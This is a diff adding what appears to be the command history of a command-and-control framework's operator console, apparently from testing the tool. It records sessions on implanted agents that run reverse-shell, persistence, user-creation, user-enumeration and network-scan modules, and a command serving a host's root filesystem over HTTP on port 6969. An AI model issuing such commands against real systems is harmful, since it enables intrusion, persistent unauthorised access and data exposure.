@@ -1,0 +1,47 @@
+agents
+mudules
+modules
+help modules
+reload_modules
+modules
+agents
+use 44cc267a-0b32-4c7d-9e54-a3ce1e4ecbd7
+ls
+shell ifconfig
+reverse_shell
+reverse_shell
+modules
+module sysinfo
+module persistence
+persistence
+module_persistence
+module create_user
+create_user
+module sysinfo
+sysinfo
+process_list
+process_list
+process_listC
+EXIT
+use aaa379a4-de39-4750-b9d1-a623855b82f3
+module_user_enum
+reload_modules
+module_user_enum
+modules_user_enum
+module_network_scan
+user_enum
+shell whoami
+user_enum
+module user_enum
+module_user_enum
+modules_user_enum
+module_user_enumclear
+agents
+use 41b63dc7-0d58-40c0-bb5d-d4593104a3ed
+back
+use 41b63dc7-0d58-40c0-bb5d-d4593104a3ed
+shell python -m http.server 6969
+shell cd /;python -m http.server 6969
+shell cd / ;python -m http.server 6969
+shell python -m http.server 6969
+shell python -m http.server 6969
